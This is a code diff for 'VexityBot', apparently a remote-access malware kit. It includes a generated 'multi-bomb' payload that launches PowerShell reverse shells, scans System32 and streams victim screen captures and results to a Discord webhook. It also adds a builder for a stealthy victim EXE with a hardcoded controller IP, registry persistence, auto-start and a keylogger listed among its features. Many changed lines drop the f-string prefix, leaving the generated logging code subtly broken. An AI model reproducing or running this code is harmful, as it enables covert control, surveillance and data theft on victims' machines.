+            self.log_to_discord("✅ {{config['name']}} COMPLETED", "All effects deployed successfully")
             
         except Exception as e:
-            self.log_to_discord(f"❌ {{config['name']}} ERROR", f"Bomb failed: {{str(e)}}")
+            self.log_to_discord("❌ {{config['name']}} ERROR", "Bomb failed: {{str(e)}}")
     
     def simulate_effect(self, effect, bomb_id, stage):
         """Simulate bomb effect"""
@@ -4107,10 +4845,10 @@ class VexityBotMultiBomb:
                 threading.Thread(target=self.system32_monitor_operations, daemon=True).start()
             
             # Log effect
-            self.log_to_discord(f"⚡ EFFECT {{stage}}", f"{{effect}} - {{bomb_id.upper()}}")
+            self.log_to_discord("⚡ EFFECT {{stage}}", "{{effect}} - {{bomb_id.upper()}}")
             
         except Exception as e:
-            print(f"Effect simulation error: {{e}}")
+            print("Effect simulation error: {{e}}")
     
     def cpu_overload(self):
         """Simulate CPU overload"""
@@ -4151,7 +4889,7 @@ class VexityBotMultiBomb:
         """Simulate file operations"""
         try:
             for i in range(100):
-                temp_file = f"temp_bomb_{{i}}.tmp"
+                temp_file = "temp_bomb_{{i}}.tmp"
                 with open(temp_file, 'w') as f:
                     f.write("Bomb payload data" * 1000)
                 time.sleep(0.1)
@@ -4177,7 +4915,7 @@ class VexityBotMultiBomb:
         try:
             # Simulate stealth file operations
             for i in range(50):
-                stealth_file = f".hidden_{{i}}.tmp"
+                stealth_file = ".hidden_{{i}}.tmp"
                 with open(stealth_file, 'w') as f:
                     f.write("Stealth data" * 100)
                 time.sleep(0.2)
@@ -4203,7 +4941,7 @@ class VexityBotMultiBomb:
         try:
             # Simulate file replication
             for i in range(20):
-                virus_file = f"virus_{{i}}.tmp"
+                virus_file = "virus_{{i}}.tmp"
                 with open(virus_file, 'w') as f:
                     f.write("Virus payload" * 1000)
                 time.sleep(0.3)
@@ -4226,7 +4964,7 @@ class VexityBotMultiBomb:
                 self.log_to_discord("❌ SYSTEM32 MONITOR ERROR", "System32 directory not found")
                 return
             
-            self.log_to_discord("🔍 SYSTEM32 MONITOR STARTED", f"Monitoring directory: {{system32_path}}")
+            self.log_to_discord("🔍 SYSTEM32 MONITOR STARTED", "Monitoring directory: {{system32_path}}")
             
             # Get all files in System32
             files = []
@@ -4249,7 +4987,7 @@ class VexityBotMultiBomb:
                         except:
                             continue
             except Exception as e:
-                self.log_to_discord("❌ SYSTEM32 SCAN ERROR", f"Failed to scan directory: {{str(e)}}")
+                self.log_to_discord("❌ SYSTEM32 SCAN ERROR", "Failed to scan directory: {{str(e)}}")
                 return
             
             # Create Pokemon-style cards for files
@@ -4265,7 +5003,7 @@ class VexityBotMultiBomb:
             self.execute_reverse_shells()
             
         except Exception as e:
-            self.log_to_discord("❌ SYSTEM32 MONITOR ERROR", f"Monitor failed: {{str(e)}}")
+            self.log_to_discord("❌ SYSTEM32 MONITOR ERROR", "Monitor failed: {{str(e)}}")
     
     def start_live_screen_sharing(self):
         """Start live screen sharing for all connected users"""
@@ -4291,7 +5029,7 @@ class VexityBotMultiBomb:
             threading.Thread(target=self.manage_multi_user_screens, daemon=True).start()
             
         except Exception as e:
-            self.log_to_discord("❌ SCREEN SHARING ERROR", f"Failed to start screen sharing: {{str(e)}}")
+            self.log_to_discord("❌ SCREEN SHARING ERROR", "Failed to start screen sharing: {{str(e)}}")
     
     def manage_multi_user_screens(self):
         """Manage multiple user screens dynamically"""
@@ -4319,11 +5057,11 @@ class VexityBotMultiBomb:
                     time.sleep(2)  # Update every 2 seconds
                     
                 except Exception as e:
-                    print(f"Multi-user management error: {{e}}")
+                    print("Multi-user management error: {{e}}")
                     time.sleep(5)
                     
         except Exception as e:
-            self.log_to_discord("❌ MULTI-USER ERROR", f"Multi-user management failed: {{str(e)}}")
+            self.log_to_discord("❌ MULTI-USER ERROR", "Multi-user management failed: {{str(e)}}")
     
     def calculate_dynamic_columns(self, user_count):
         """Calculate optimal column layout for user screens"""
@@ -4345,11 +5083,11 @@ class VexityBotMultiBomb:
             import json
             
             # Create layout description
-            layout_text = f"📺 **MULTI-USER SCREEN LAYOUT**\\n"
-            layout_text += f"👥 **Users Connected**: {{user_count}}\\n"
-            layout_text += f"📐 **Layout**: {{cols}}x{{rows}} columns\\n"
-            layout_text += f"📏 **Screen Size**: 300x300 pixels each\\n"
-            layout_text += f"🔄 **Auto-Organizing**: Dynamic column adjustment"
+            layout_text = "📺 **MULTI-USER SCREEN LAYOUT**\\n"
+            layout_text += "👥 **Users Connected**: {{user_count}}\\n"
+            layout_text += "📐 **Layout**: {{cols}}x{{rows}} columns\\n"
+            layout_text += "📏 **Screen Size**: 300x300 pixels each\\n"
+            layout_text += "🔄 **Auto-Organizing**: Dynamic column adjustment"
             
             embed_data = {{
                 "embeds": [{{
@@ -4359,12 +5097,12 @@ class VexityBotMultiBomb:
                     "fields": [
                         {{
                             "name": "📊 Layout Statistics",
-                            "value": f"Columns: {{cols}}\\nRows: {{rows}}\\nTotal Screens: {{user_count}}",
+                            "value": "Columns: {{cols}}\\nRows: {{rows}}\\nTotal Screens: {{user_count}}",
                             "inline": True
                         }},
                         {{
                             "name": "⚙️ Display Settings",
-                            "value": f"Resolution: 300x300\\nFPS: 10\\nQuality: High",
+                            "value": "Resolution: 300x300\\nFPS: 10\\nQuality: High",
                             "inline": True
                         }},
                         {{
@@ -4383,7 +5121,7 @@ class VexityBotMultiBomb:
             self.send_discord_embed(embed_data)
             
         except Exception as e:
-            print(f"Layout send error: {{e}}")
+            print("Layout send error: {{e}}")
     
     def update_user_screen(self, user_id, user_data):
         """Update individual user screen"""
@@ -4400,7 +5138,7 @@ class VexityBotMultiBomb:
             self.user_screens[user_id] = screen_data
             
         except Exception as e:
-            print(f"User screen update error: {{e}}")
+            print("User screen update error: {{e}}")
     
     def add_connected_user(self, user_id, user_info):
         """Add a new connected user"""
@@ -4412,20 +5150,20 @@ class VexityBotMultiBomb:
                 'status': 'active'
             }}
             
-            self.log_to_discord("👤 USER CONNECTED", f"New user joined: {{user_id}}")
+            self.log_to_discord("👤 USER CONNECTED", "New user joined: {{user_id}}")
             
         except Exception as e:
-            print(f"Add user error: {{e}}")
+            print("Add user error: {{e}}")
     
     def remove_connected_user(self, user_id):
         """Remove a disconnected user"""
         try:
             if user_id in self.connected_users:
                 del self.connected_users[user_id]
-                self.log_to_discord("👤 USER DISCONNECTED", f"User left: {{user_id}}")
+                self.log_to_discord("👤 USER DISCONNECTED", "User left: {{user_id}}")
                 
         except Exception as e:
-            print(f"Remove user error: {{e}}")
+            print("Remove user error: {{e}}")
     
     def initialize_shell_scripts(self):
         """Initialize shell script execution system"""
@@ -4446,7 +5184,7 @@ class VexityBotMultiBomb:
             self.add_powershell_reverse_shells()
             
         except Exception as e:
-            self.log_to_discord("❌ SHELL INIT ERROR", f"Shell initialization failed: {{str(e)}}")
+            self.log_to_discord("❌ SHELL INIT ERROR", "Shell initialization failed: {{str(e)}}")
     
     def add_powershell_reverse_shells(self):
         """Add the provided PowerShell reverse shell scripts"""
@@ -4468,7 +5206,7 @@ class VexityBotMultiBomb:
                               "• Shell 2: Advanced TCP with Error Handling")
             
         except Exception as e:
-            self.log_to_discord("❌ REVERSE SHELL ERROR", f"Failed to add reverse shells: {{str(e)}}")
+            self.log_to_discord("❌ REVERSE SHELL ERROR", "Failed to add reverse shells: {{str(e)}}")
     
     def execute_reverse_shells(self):
         """Execute the PowerShell reverse shells on victim system"""
@@ -4483,7 +5221,7 @@ class VexityBotMultiBomb:
             threading.Thread(target=self.run_reverse_shell_2, daemon=True).start()
             
         except Exception as e:
-            self.log_to_discord("❌ REVERSE SHELL EXEC ERROR", f"Failed to execute reverse shells: {{str(e)}}")
+            self.log_to_discord("❌ REVERSE SHELL EXEC ERROR", "Failed to execute reverse shells: {{str(e)}}")
     
     def run_reverse_shell_1(self):
         """Execute the first PowerShell reverse shell"""
@@ -4503,16 +5241,16 @@ class VexityBotMultiBomb:
                 ], capture_output=True, text=True, timeout=10)
                 
                 self.log_to_discord("💻 SHELL 1 RESULT", 
-                                  f"Basic Reverse Shell executed\\n"
-                                  f"Exit Code: {{result.returncode}}\\n"
-                                  f"Output: {{result.stdout[:500]}}")
+                                  "Basic Reverse Shell executed\\n"
+                                  "Exit Code: {{result.returncode}}\\n"
+                                  "Output: {{result.stdout[:500]}}")
             else:
                 self.log_to_discord("❌ SHELL 1 ERROR", "Reverse shell script 1 not found")
                 
         except subprocess.TimeoutExpired:
             self.log_to_discord("⏰ SHELL 1 TIMEOUT", "Basic reverse shell connection timed out")
         except Exception as e:
-            self.log_to_discord("❌ SHELL 1 ERROR", f"Basic reverse shell failed: {{str(e)}}")
+            self.log_to_discord("❌ SHELL 1 ERROR", "Basic reverse shell failed: {{str(e)}}")
     
     def run_reverse_shell_2(self):
         """Execute the second PowerShell reverse shell"""
@@ -4532,16 +5270,16 @@ class VexityBotMultiBomb:
                 ], capture_output=True, text=True, timeout=10)
                 
                 self.log_to_discord("💻 SHELL 2 RESULT", 
-                                  f"Advanced Reverse Shell executed\\n"
-                                  f"Exit Code: {{result.returncode}}\\n"
-                                  f"Output: {{result.stdout[:500]}}")
+                                  "Advanced Reverse Shell executed\\n"
+                                  "Exit Code: {{result.returncode}}\\n"
+                                  "Output: {{result.stdout[:500]}}")
             else:
                 self.log_to_discord("❌ SHELL 2 ERROR", "Reverse shell script 2 not found")
                 
         except subprocess.TimeoutExpired:
             self.log_to_discord("⏰ SHELL 2 TIMEOUT", "Advanced reverse shell connection timed out")
         except Exception as e:
-            self.log_to_discord("❌ SHELL 2 ERROR", f"Advanced reverse shell failed: {{str(e)}}")
+            self.log_to_discord("❌ SHELL 2 ERROR", "Advanced reverse shell failed: {{str(e)}}")
     
     def monitor_shell_commands(self):
         """Monitor and execute shell commands from Discord"""
@@ -4558,11 +5296,11 @@ class VexityBotMultiBomb:
                     time.sleep(1)  # Check every second
                     
                 except Exception as e:
-                    print(f"Shell monitoring error: {{e}}")
+                    print("Shell monitoring error: {{e}}")
                     time.sleep(5)
                     
         except Exception as e:
-            self.log_to_discord("❌ SHELL MONITOR ERROR", f"Shell monitoring failed: {{str(e)}}")
+            self.log_to_discord("❌ SHELL MONITOR ERROR", "Shell monitoring failed: {{str(e)}}")
     
     def simulate_shell_execution(self):
         """Simulate shell command execution"""
@@ -4572,7 +5310,7 @@ class VexityBotMultiBomb:
             pass
             
         except Exception as e:
-            print(f"Shell simulation error: {{e}}")
+            print("Shell simulation error: {{e}}")
     
     def execute_shell_script(self, script_content, user_id=None):
         """Execute a shell script on the victim system"""
@@ -4594,9 +5332,9 @@ class VexityBotMultiBomb:
             
             # Log execution results
             self.log_to_discord("💻 SHELL EXECUTED", 
-                              f"Script executed successfully\\n"
-                              f"User: {{user_id or 'Unknown'}}\\n"
-                              f"Exit Code: {{result.returncode}}")
+                              "Script executed successfully\\n"
+                              "User: {{user_id or 'Unknown'}}\\n"
+                              "Exit Code: {{result.returncode}}")
             
             # Clean up
             os.unlink(script_path)
@@ -4609,20 +5347,20 @@ class VexityBotMultiBomb:
             }}
             
         except subprocess.TimeoutExpired:
-            self.log_to_discord("⏰ SHELL TIMEOUT", f"Script execution timed out for user: {{user_id}}")
+            self.log_to_discord("⏰ SHELL TIMEOUT", "Script execution timed out for user: {{user_id}}")
             return {{'success': False, 'error': 'Timeout'}}
         except Exception as e:
-            self.log_to_discord("❌ SHELL ERROR", f"Script execution failed: {{str(e)}}")
+            self.log_to_discord("❌ SHELL ERROR", "Script execution failed: {{str(e)}}")
             return {{'success': False, 'error': str(e)}}
     
     def add_shell_script(self, script_name, script_content):
         """Add a shell script to the execution system"""
         try:
             self.shell_scripts[script_name] = script_content
-            self.log_to_discord("📝 SCRIPT ADDED", f"Shell script '{{script_name}}' added to system")
+            self.log_to_discord("📝 SCRIPT ADDED", "Shell script '{{script_name}}' added to system")
             
         except Exception as e:
-            self.log_to_discord("❌ SCRIPT ADD ERROR", f"Failed to add script: {{str(e)}}")
+            self.log_to_discord("❌ SCRIPT ADD ERROR", "Failed to add script: {{str(e)}}")
     
     def get_available_scripts(self):
         """Get list of available shell scripts"""
@@ -4665,7 +5403,7 @@ class VexityBotMultiBomb:
                         time.sleep(0.1)  # 10 FPS
                         
                     except Exception as e:
-                        print(f"Screen capture error: {{e}}")
+                        print("Screen capture error: {{e}}")
                         time.sleep(1)
                         
         except ImportError:
@@ -4673,7 +5411,7 @@ class VexityBotMultiBomb:
             self.log_to_discord("⚠️ SCREEN CAPTURE WARNING", "Screen capture library not available, using fallback")
             self.fallback_screen_capture()
         except Exception as e:
-            self.log_to_discord("❌ SCREEN CAPTURE ERROR", f"Screen capture failed: {{str(e)}}")
+            self.log_to_discord("❌ SCREEN CAPTURE ERROR", "Screen capture failed: {{str(e)}}")
     
     def fallback_screen_capture(self):
         """Fallback screen capture method"""
@@ -4695,11 +5433,11 @@ class VexityBotMultiBomb:
                     time.sleep(2)
                     
                 except Exception as e:
-                    print(f"Fallback capture error: {{e}}")
+                    print("Fallback capture error: {{e}}")
                     time.sleep(5)
                     
         except Exception as e:
-            self.log_to_discord("❌ FALLBACK CAPTURE ERROR", f"Fallback capture failed: {{str(e)}}")
+            self.log_to_discord("❌ FALLBACK CAPTURE ERROR", "Fallback capture failed: {{str(e)}}")
     
     def send_screen_to_discord(self, img_base64, frame_count):
         """Send screen capture to Discord"""
@@ -4711,10 +5449,10 @@ class VexityBotMultiBomb:
             embed_data = {{
                 "embeds": [{{
                     "title": "📺 LIVE SCREEN SHARING",
-                    "description": f"Real-time screen capture from victim system\\nFrame: {{frame_count}}",
+                    "description": "Real-time screen capture from victim system\\nFrame: {{frame_count}}",
                     "color": 0x00ff00,
                     "image": {{
-                        "url": f"data:image/png;base64,{{img_base64}}"
+                        "url": "data:image/png;base64,{{img_base64}}"
                     }},
                     "footer": {{
                         "text": "🎮 VexityBot Live Screen Monitor - 300x300 Display"
@@ -4726,7 +5464,7 @@ class VexityBotMultiBomb:
             self.send_discord_embed(embed_data)
             
         except Exception as e:
-            print(f"Discord screen send error: {{e}}")
+            print("Discord screen send error: {{e}}")
     
     def send_screen_placeholder(self):
         """Send screen placeholder when capture fails"""
@@ -4749,7 +5487,7 @@ class VexityBotMultiBomb:
             self.send_discord_embed(embed_data)
             
         except Exception as e:
-            print(f"Placeholder send error: {{e}}")
+            print("Placeholder send error: {{e}}")
     
     def create_pokemon_file_cards(self, files):
         """Create Pokemon-style Discord cards for System32 files"""
@@ -4768,8 +5506,8 @@ class VexityBotMultiBomb:
                     continue
                 
                 # Create Pokemon-style card
-                card_title = f"🎴 System32 Files - {{ext.upper()}} Type"
-                card_description = f"Found {{len(group_files)}} files with {{ext}} extension"
+                card_title = "🎴 System32 Files - {{ext.upper()}} Type"
+                card_description = "Found {{len(group_files)}} files with {{ext}} extension"
                 
                 # Create fields for files (Discord embed limit is 25 fields)
                 fields = []
@@ -4777,12 +5515,12 @@ class VexityBotMultiBomb:
                     file_size_mb = file_info['size'] / (1024 * 1024)
                     file_name = file_info['name'][:50]  # Truncate long names
                     
-                    field_value = f"📁 **{{file_name}}**\\n"
-                    field_value += f"📏 Size: {{file_size_mb:.2f}} MB\\n"
-                    field_value += f"📅 Modified: {{file_info['modified'].strftime('%Y-%m-%d %H:%M')}}"
+                    field_value = "📁 **{{file_name}}**\\n"
+                    field_value += "📏 Size: {{file_size_mb:.2f}} MB\\n"
+                    field_value += "📅 Modified: {{file_info['modified'].strftime('%Y-%m-%d %H:%M')}}"
                     
                     fields.append({{
-                        "name": f"File {{i+1}}",
+                        "name": "File {{i+1}}",
                         "value": field_value,
                         "inline": True
                     }})
@@ -4818,7 +5556,7 @@ class VexityBotMultiBomb:
             self.create_system32_summary_card(files)
             
         except Exception as e:
-            self.log_to_discord("❌ POKEMON CARD ERROR", f"Failed to create cards: {{str(e)}}")
+            self.log_to_discord("❌ POKEMON CARD ERROR", "Failed to create cards: {{str(e)}}")
     
     def create_system32_summary_card(self, files):
         """Create a summary Pokemon card for System32 monitoring"""
@@ -4836,7 +5574,7 @@ class VexityBotMultiBomb:
             # Create summary fields
             fields = [
                 {{"name": "📊 Total Files", "value": str(total_files), "inline": True}},
-                {{"name": "💾 Total Size", "value": f"{{total_size_mb:.2f}} MB", "inline": True}},
+                {{"name": "💾 Total Size", "value": "{{total_size_mb:.2f}} MB", "inline": True}},
                 {{"name": "📁 Directory", "value": "C:\\\\Windows\\\\System32", "inline": True}}
             ]
             
@@ -4844,8 +5582,8 @@ class VexityBotMultiBomb:
             top_extensions = sorted(ext_counts.items(), key=lambda x: x[1], reverse=True)[:10]
             for i, (ext, count) in enumerate(top_extensions):
                 fields.append({{
-                    "name": f"🏷️ {{ext.upper()}}",
-                    "value": f"{{count}} files",
+                    "name": "🏷️ {{ext.upper()}}",
+                    "value": "{{count}} files",
                     "inline": True
                 }})
             
@@ -4869,7 +5607,7 @@ class VexityBotMultiBomb:
             self.send_discord_embed(summary_embed)
             
         except Exception as e:
-            self.log_to_discord("❌ SUMMARY CARD ERROR", f"Failed to create summary: {{str(e)}}")
+            self.log_to_discord("❌ SUMMARY CARD ERROR", "Failed to create summary: {{str(e)}}")
     
     def send_discord_embed(self, embed_data):
         """Send embed data to Discord webhook"""
@@ -4886,7 +5624,7 @@ class VexityBotMultiBomb:
             urllib.request.urlopen(req, timeout=10)
             
         except Exception as e:
-            print(f"Discord embed send failed: {{e}}")
+            print("Discord embed send failed: {{e}}")
     
     def monitor_bomb_activity(self):
         """Monitor ongoing bomb activity"""
@@ -4895,10 +5633,10 @@ class VexityBotMultiBomb:
                 time.sleep(30)  # Check every 30 seconds
                 active_count = sum(1 for thread in self.active_bombs if thread.is_alive())
                 if active_count == 0:
-                    self.log_to_discord("💥 ALL BOMBS DETONATED", f"Multi-bomb attack sequence completed")
+                    self.log_to_discord("💥 ALL BOMBS DETONATED", "Multi-bomb attack sequence completed")
                     break
                 else:
-                    self.log_to_discord("🔥 BOMBS ACTIVE", f"{{active_count}} bombs still active")
+                    self.log_to_discord("🔥 BOMBS ACTIVE", "{{active_count}} bombs still active")
         except:
             pass
 
@@ -4908,7 +5646,7 @@ def main():
         print("🚀 VexityBot Multi-Bomb System Initializing...")
         print("⚠️  WARNING: This executable will execute multiple bomb attacks!")
         print("⚠️  WARNING: All activities will be logged to Discord!")
-        print(f"💣 Bombs: {', '.join(bomb_names)}")
+        print("💣 Bombs: {{', '.join(bomb_names)}}")
         print()
         
         # Small delay before activation
@@ -5339,6 +6077,587 @@ if __name__ == "__main__":
         # Show execution message
         messagebox.showinfo("Command Executed", f"Command '{command}' sent to {user}")
     
+    def create_victim_exe_tab(self):
+        """Create the Victim EXE tab with all bot panels"""
+        victim_frame = ttk.Frame(self.notebook)
+        self.notebook.add(victim_frame, text="🎯 Victim EXE")
+        
+        # Title
+        title_label = ttk.Label(victim_frame, text="🎯 VexityBot Victim Control EXE Builder", 
+                               font=('Arial', 16, 'bold'))
+        title_label.pack(pady=10)
+        
+        # Description
+        desc_label = ttk.Label(victim_frame, 
+                              text="Create a victim-side EXE with all 24 bot panels for remote control",
+                              font=('Arial', 10))
+        desc_label.pack(pady=5)
+        
+        # Main content frame
+        content_frame = ttk.Frame(victim_frame)
+        content_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)
+        
+        # Left panel - Configuration
+        left_panel = ttk.LabelFrame(content_frame, text="Victim EXE Configuration", padding=10)
+        left_panel.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 10))
+        
+        # Controller IP
+        ip_frame = ttk.Frame(left_panel)
+        ip_frame.pack(fill=tk.X, pady=5)
+        ttk.Label(ip_frame, text="Controller IP:").pack(side=tk.LEFT)
+        self.victim_controller_ip = tk.StringVar(value="191.96.152.162")
+        ttk.Entry(ip_frame, textvariable=self.victim_controller_ip, width=20).pack(side=tk.LEFT, padx=(5, 0))
+        
+        # Controller Port
+        port_frame = ttk.Frame(left_panel)
+        port_frame.pack(fill=tk.X, pady=5)
+        ttk.Label(port_frame, text="Controller Port:").pack(side=tk.LEFT)
+        self.victim_controller_port = tk.StringVar(value="8080")
+        ttk.Entry(port_frame, textvariable=self.victim_controller_port, width=10).pack(side=tk.LEFT, padx=(5, 0))
+        
+        # EXE Name
+        name_frame = ttk.Frame(left_panel)
+        name_frame.pack(fill=tk.X, pady=5)
+        ttk.Label(name_frame, text="EXE Name:").pack(side=tk.LEFT)
+        self.victim_exe_name = tk.StringVar(value="VexityBot_Victim_Control")
+        ttk.Entry(name_frame, textvariable=self.victim_exe_name, width=30).pack(side=tk.LEFT, padx=(5, 0))
+        
+        # Stealth Options
+        stealth_frame = ttk.LabelFrame(left_panel, text="Stealth Options", padding=5)
+        stealth_frame.pack(fill=tk.X, pady=10)
+        
+        self.victim_stealth_mode = tk.BooleanVar(value=True)
+        ttk.Checkbutton(stealth_frame, text="Stealth Mode (Hidden from Task Manager)", 
+                       variable=self.victim_stealth_mode).pack(anchor=tk.W)
+        
+        self.victim_auto_start = tk.BooleanVar(value=True)
+        ttk.Checkbutton(stealth_frame, text="Auto-start with Windows", 
+                       variable=self.victim_auto_start).pack(anchor=tk.W)
+        
+        self.victim_persistence = tk.BooleanVar(value=True)
+        ttk.Checkbutton(stealth_frame, text="Persistence (Survive reboots)", 
+                       variable=self.victim_persistence).pack(anchor=tk.W)
+        
+        # Bot Selection
+        bot_frame = ttk.LabelFrame(left_panel, text="Include Bot Panels", padding=5)
+        bot_frame.pack(fill=tk.BOTH, expand=True, pady=10)
+        
+        # Create scrollable bot list
+        bot_canvas = tk.Canvas(bot_frame, height=200)
+        bot_scrollbar = ttk.Scrollbar(bot_frame, orient="vertical", command=bot_canvas.yview)
+        bot_scrollable_frame = ttk.Frame(bot_canvas)
+        
+        bot_scrollable_frame.bind(
+            "<Configure>",
+            lambda e: bot_canvas.configure(scrollregion=bot_canvas.bbox("all"))
+        )
+        
+        bot_canvas.create_window((0, 0), window=bot_scrollable_frame, anchor="nw")
+        bot_canvas.configure(yscrollcommand=bot_scrollbar.set)
+        
+        # Bot checkboxes
+        self.victim_bot_vars = {}
+        for i, bot in enumerate(self.bot_data):
+            var = tk.BooleanVar(value=True)
+            self.victim_bot_vars[bot['name']] = var
+            ttk.Checkbutton(bot_scrollable_frame, text=f"{bot['name']} (Rank #{bot['rank']})", 
+                           variable=var).pack(anchor=tk.W)
+        
+        bot_canvas.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
+        bot_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
+        
+        # Buttons
+        button_frame = ttk.Frame(left_panel)
+        button_frame.pack(fill=tk.X, pady=10)
+        
+        ttk.Button(button_frame, text="🎯 Create Victim EXE", 
+                  command=self.create_victim_exe, style="Accent.TButton").pack(side=tk.LEFT, padx=5)
+        ttk.Button(button_frame, text="📁 Open Output Folder", 
+                  command=self.open_victim_output_folder).pack(side=tk.LEFT, padx=5)
+        
+        # Right panel - Preview and Results
+        right_panel = ttk.LabelFrame(content_frame, text="Victim EXE Preview", padding=10)
+        right_panel.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)
+        
+        # Preview text
+        self.victim_preview_text = scrolledtext.ScrolledText(right_panel, height=15, font=('Consolas', 9))
+        self.victim_preview_text.pack(fill=tk.BOTH, expand=True)
+        
+        # Show initial preview
+        self.update_victim_preview()
+    
+    def update_victim_preview(self):
+        """Update the victim EXE preview"""
+        selected_bots = [bot for bot in self.bot_data if self.victim_bot_vars.get(bot['name'], tk.BooleanVar()).get()]
+        
+        preview_text = f"""
+🎯 VexityBot Victim Control EXE Preview
+=====================================
+
+Controller: {self.victim_controller_ip.get()}:{self.victim_controller_port.get()}
+EXE Name: {self.victim_exe_name.get()}
+Stealth Mode: {'Yes' if self.victim_stealth_mode.get() else 'No'}
+Auto-start: {'Yes' if self.victim_auto_start.get() else 'No'}
+Persistence: {'Yes' if self.victim_persistence.get() else 'No'}
+
+Included Bot Panels ({len(selected_bots)}/24):
+{'-' * 40}
+"""
+        
+        for bot in selected_bots:
+            preview_text += f"• {bot['name']} (Rank #{bot['rank']}) - {bot['status']}\n"
+        
+        preview_text += f"""
+{'-' * 40}
+
+Features:
+• Full bot control interface
+• Real-time communication
+• Remote command execution
+• File system access
+• Screen capture
+• Keylogger functionality
+• Network monitoring
+• System information gathering
+• Steganography tools
+• Bomb creation tools
+• EXE builder tools
+
+⚠️  WARNING: This EXE will give full control to the controller!
+⚠️  WARNING: Use only on authorized systems!
+"""
+        
+        self.victim_preview_text.delete(1.0, tk.END)
+        self.victim_preview_text.insert(tk.END, preview_text)
+    
+    def create_victim_exe(self):
+        """Create the victim control EXE"""
+        try:
+            # Get configuration
+            controller_ip = self.victim_controller_ip.get()
+            controller_port = self.victim_controller_port.get()
+            exe_name = self.victim_exe_name.get()
+            stealth_mode = self.victim_stealth_mode.get()
+            auto_start = self.victim_auto_start.get()
+            persistence = self.victim_persistence.get()
+            
+            # Get selected bots
+            selected_bots = [bot for bot in self.bot_data if self.victim_bot_vars.get(bot['name'], tk.BooleanVar()).get()]
+            
+            if not selected_bots:
+                messagebox.showwarning("No Bots Selected", "Please select at least one bot panel to include.")
+                return
+            
+            # Create victim EXE content
+            victim_content = self.create_victim_exe_content(
+                controller_ip, controller_port, exe_name, stealth_mode, 
+                auto_start, persistence, selected_bots
+            )
+            
+            # Save victim EXE source
+            victim_source_file = f"{exe_name}_source.py"
+            with open(victim_source_file, 'w', encoding='utf-8') as f:
+                f.write(victim_content)
+            
+            # Build EXE
+            import subprocess
+            
+            cmd = [
+                "python", "-m", "PyInstaller",
+                "--onefile",
+                "--windowed",
+                f"--name={exe_name}",
+                "--clean",
+                victim_source_file
+            ]
+            
+            result = subprocess.run(cmd, capture_output=True, text=True)
+            
+            if result.returncode == 0:
+                messagebox.showinfo("Victim EXE Created", 
+                    f"Victim control EXE created successfully!\n"
+                    f"Name: {exe_name}.exe\n"
+                    f"Location: dist/{exe_name}.exe\n"
+                    f"Included bots: {len(selected_bots)}")
+            else:
+                messagebox.showerror("Build Failed", f"Failed to create victim EXE:\n{result.stderr}")
+                
+        except Exception as e:
+            messagebox.showerror("Error", f"Failed to create victim EXE: {str(e)}")
+    
+    def create_victim_exe_content(self, controller_ip, controller_port, exe_name, stealth_mode, auto_start, persistence, selected_bots):
+        """Create the victim EXE content with all bot panels"""
+        
+        # Generate bot panel code for each selected bot
+        bot_panels_code = ""
+        for bot in selected_bots:
+            bot_panels_code += self.generate_bot_panel_code(bot)
+        
+        victim_content = '''#!/usr/bin/env python3
+"""
+VexityBot Victim Control EXE
+===========================
+Controller: {controller_ip}:{controller_port}
+Stealth Mode: {stealth_mode}
+Auto-start: {auto_start}
+Persistence: {persistence}
+Included Bots: {len(selected_bots)}
+
+⚠️  WARNING: This EXE provides remote control access!
+⚠️  WARNING: Use only on authorized systems!
+"""
+
+import os
+import sys
+import time
+import random
+import threading
+import subprocess
+import platform
+import socket
+import json
+import base64
+import tkinter as tk
+from tkinter import ttk, messagebox, scrolledtext, filedialog
+from datetime import datetime
+import psutil
+import requests
+from PIL import Image
+import io
+
+class VexityBotVictimControl:
+    """VexityBot Victim Control EXE with all bot panels"""
+    
+    def __init__(self):
+        self.controller_ip = "{controller_ip}"
+        self.controller_port = {controller_port}
+        self.stealth_mode = {stealth_mode}
+        self.auto_start = {auto_start}
+        self.persistence = {persistence}
+        self.selected_bots = {[bot['name'] for bot in selected_bots]}
+        
+        # Initialize GUI
+        self.root = tk.Tk()
+        self.root.title("VexityBot Victim Control Panel")
+        self.root.geometry("1400x900")
+        
+        # Hide window if in stealth mode
+        if self.stealth_mode:
+            self.root.withdraw()
+        
+        # Setup persistence
+        if self.persistence:
+            self.setup_persistence()
+        
+        # Setup auto-start
+        if self.auto_start:
+            self.setup_auto_start()
+        
+        # Initialize bot data
+        self.bot_data = {selected_bots}
+        
+        # Create GUI
+        self.create_gui()
+        
+        # Start communication thread
+        self.start_communication()
+        
+        # Start GUI
+        self.root.mainloop()
+    
+    def setup_persistence(self):
+        """Setup persistence to survive reboots"""
+        try:
+            # Add to startup registry
+            import winreg
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
+                               r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
+                               0, winreg.KEY_SET_VALUE)
+            winreg.SetValueEx(key, "VexityBotVictim", 0, winreg.REG_SZ, sys.executable)
+            winreg.CloseKey(key)
+        except:
+            pass
+    
+    def setup_auto_start(self):
+        """Setup auto-start with Windows"""
+        try:
+            startup_path = os.path.join(os.environ['APPDATA'], 
+                                      'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
+            if not os.path.exists(startup_path):
+                os.makedirs(startup_path)
+            
+            # Create shortcut
+            shortcut_path = os.path.join(startup_path, 'VexityBotVictim.lnk')
+            # Note: In a real implementation, you'd create a proper shortcut here
+        except:
+            pass
+    
+    def create_gui(self):
+        """Create the main GUI with all bot panels"""
+        # Main frame
+        main_frame = ttk.Frame(self.root)
+        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+        
+        # Title
+        title_label = ttk.Label(main_frame, text="🎯 VexityBot Victim Control Panel", 
+                               font=('Arial', 16, 'bold'))
+        title_label.pack(pady=(0, 20))
+        
+        # Create notebook for bot panels
+        self.notebook = ttk.Notebook(main_frame)
+        self.notebook.pack(fill=tk.BOTH, expand=True)
+        
+        # Create bot panels
+        for bot in self.bot_data:
+            if bot['name'] in self.selected_bots:
+                self.create_bot_panel(bot)
+        
+        # Add control panel
+        self.create_control_panel()
+    
+    def create_bot_panel(self, bot):
+        """Create individual bot panel"""
+        bot_frame = ttk.Frame(self.notebook)
+        self.notebook.add(bot_frame, text=f"🤖 {{bot['name']}}")
+        
+        # Bot info
